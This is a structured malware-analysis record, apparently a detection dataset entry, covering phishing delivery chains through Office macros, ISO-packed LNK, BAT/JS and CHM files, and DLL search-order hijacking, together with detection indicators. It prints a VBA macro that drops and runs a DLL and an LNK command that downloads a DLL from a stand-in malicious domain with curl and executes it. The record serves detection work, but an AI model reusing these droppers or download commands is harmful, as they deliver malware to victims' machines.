package_info.package_manager: N/A (malware distributed via phishing attachments, not a package manager)
package_info.package_versions: N/A (malicious files: Excel, Word, ISO, LNK, CHM, DLL, JS, BAT, etc.)
package_info.why_malicious: The entire delivery chain is designed to infect Windows systems via phishing emails containing malicious attachments or links. These files leverage macros, script execution, DLL hijacking, and obfuscated payloads to download, drop, and execute malware, ultimately compromising the victim's device, stealing sensitive data, and enabling further malware deployment.

execution_context.trigger: import-time (on file open, if macros enabled)
execution_context.file_location: Excel 4.0 Macro sheet (Sheet 7, cell F2 named 'Auto_Open')

malicious_snippets.code_behavior: At import-time, the macro downloads a malware payload from a remote server using URLDownloadToFileA, saves it to disk, and executes it via regsvr32.exe, resulting in remote code execution.

malice_analysis.why_suspicious: Macros that download and execute files from the internet are a classic malware delivery technique.
malice_analysis.violated_expectations: Normal Excel macros should not perform network operations or execute system binaries.
malice_analysis.similar_legitimate_use: Automated document processing in trusted environments (rare).
key_indicators: Auto_Open macro triggers on file open

execution_context.trigger: import-time (on document open, if macros enabled)

malicious_snippets.code_snippet:
Sub Document_Open()
  Dim s As String
  s = GetTextFromXML('customXml/item1.xml')
  Dim b() As Byte
  b = HexStringToBytes(s)
  WriteBytesToFile('c:\ProgramData\xxx.dll', b)
  Shell 'rundll32.exe c:\ProgramData\xxx.dll,EntryPoint'
End Sub
malicious_snippets.code_behavior: At import-time, the macro extracts a PE file from embedded XML, writes it as a DLL to disk, and executes it using rundll32.exe, resulting in malware installation.

malice_analysis.why_suspicious: VBA macros that write executable files and launch them are highly indicative of malware.
malice_analysis.violated_expectations: Legitimate Word macros should not drop or execute DLLs.
malice_analysis.similar_legitimate_use: Automated deployment scripts in trusted, internal environments (rare).
key_indicators: Extraction of binary data from custom XML

execution_context.trigger: user action (double-click LNK file in ISO)

malicious_snippets.code_snippet: LNK target: cmd.exe /c start image.png & curl.exe -o C:\Users\Public\malware.dll http://malicious-domain.com/payload.dll & rundll32.exe C:\Users\Public\malware.dll,EntryPoint
malicious_snippets.code_behavior: On user execution, the LNK file opens a decoy image, downloads a DLL from a remote server using curl.exe, and executes it with rundll32.exe, resulting in malware execution.

malice_analysis.why_suspicious: LNK files that chain decoy file opening with network download and DLL execution are a hallmark of phishing malware.
malice_analysis.violated_expectations: LNK files should not perform network downloads or execute DLLs.
malice_analysis.similar_legitimate_use: Automated installers (with user consent and clear intent).
key_indicators: Use of curl.exe to download DLL

execution_context.trigger: user action (double-click LNK file in ISO, triggers BAT and JS chain)
execution_context.file_location: LNK file -> BAT file (alsoThing.bat) -> JS file (weTo.js) inside ISO

malicious_snippets.code_behavior: On user execution, the LNK file runs a BAT script, which launches a JS script that copies a disguised DLL (thenTake.txt) to a new location and executes it with rundll32.exe, enabling obfuscated malware execution.

malice_analysis.why_suspicious: Multi-stage script chains with file renaming and execution are used to evade detection.
malice_analysis.violated_expectations: Installer scripts should not obfuscate payloads or execute DLLs from .txt files.
malice_analysis.similar_legitimate_use: Complex installers (with user consent and transparency).

execution_context.trigger: user action (open CHM file in ISO)
execution_context.file_location: CHM file with appended script inside ISO

malicious_snippets.code_behavior: On user execution, the CHM file runs an embedded script that launches rundll32.exe to execute a malicious DLL (app.dll), resulting in malware execution.

malice_analysis.why_suspicious: CHM files with embedded scripts that execute DLLs are a known malware delivery vector.
malice_analysis.violated_expectations: Help files should not execute arbitrary code.
malice_analysis.similar_legitimate_use: Custom help systems (rare, and not for DLL execution).

execution_context.trigger: user action (double-click LNK file in ISO, triggers DLL hijacking)
execution_context.file_location: LNK file, calc.exe, WindowsCodecs.dll, 102755.dll inside ISO

malicious_snippets.code_behavior: On user execution, the LNK file runs calc.exe, which loads a malicious WindowsCodecs.dll (due to DLL search order hijacking). The DLL then spawns regsvr32.exe to execute another malicious DLL (102755.dll), resulting in malware execution.

malice_analysis.why_suspicious: DLL search order hijacking with a legitimate executable is a stealthy malware technique.
malice_analysis.violated_expectations: Legitimate DLLs should not spawn new processes to execute additional DLLs.
malice_analysis.similar_legitimate_use: Testing environments (rare, and not for malware).
key_indicators: Malicious DLL named as system DLL

attack_chain.action: Phishing email delivers a malicious attachment (Excel, Word, ISO, or HTML Smuggling link).
User opens the malicious file, triggering code execution (macro, LNK, CHM, etc.).
attack_chain.leads_to: Malware payload is downloaded, dropped, or executed.

attack_chain.action: Malware payload is executed (via regsvr32.exe, rundll32.exe, or DLL hijacking).
attack_chain.leads_to: System compromise, data theft, or further malware deployment.

behavioral_signatures: Office macros that download and execute files
LNK files that chain decoy file opening with network download and DLL execution
Script chains (BAT/JS) that rename and execute disguised DLLs
CHM files with embedded scripts that launch rundll32.exe
DLL search order hijacking with system-named DLLs spawning new processes
file_indicators: Excel files with Excel 4.0 macros (Auto_Open, URLDownloadToFileA)
Word documents with VBA macros writing DLLs to disk
ISO files containing LNK, BAT, JS, CHM, DLL, or decoy files
DLLs named as system libraries (e.g., WindowsCodecs.dll) in non-system locations
Files with misleading extensions (e.g., .txt containing DLL payloads)
network_indicators: curl.exe or similar tools downloading payloads from suspicious domains
Office macros or scripts making outbound HTTP/HTTPS requests
detection_knowledge.how_to_detect: Monitor for Office documents with macros that perform network downloads or write executables to disk. Flag LNK files in disk images that execute chained commands, especially those invoking curl.exe, rundll32.exe, or regsvr32.exe. Detect script chains (BAT/JS) that manipulate and execute DLLs, and CHM files with embedded scripts. Watch for DLL search order hijacking by identifying non-system DLLs with system names loaded by legitimate executables. Correlate with network activity to suspicious domains or IPs, and alert on files with misleading extensions or unexpected file types in disk images.
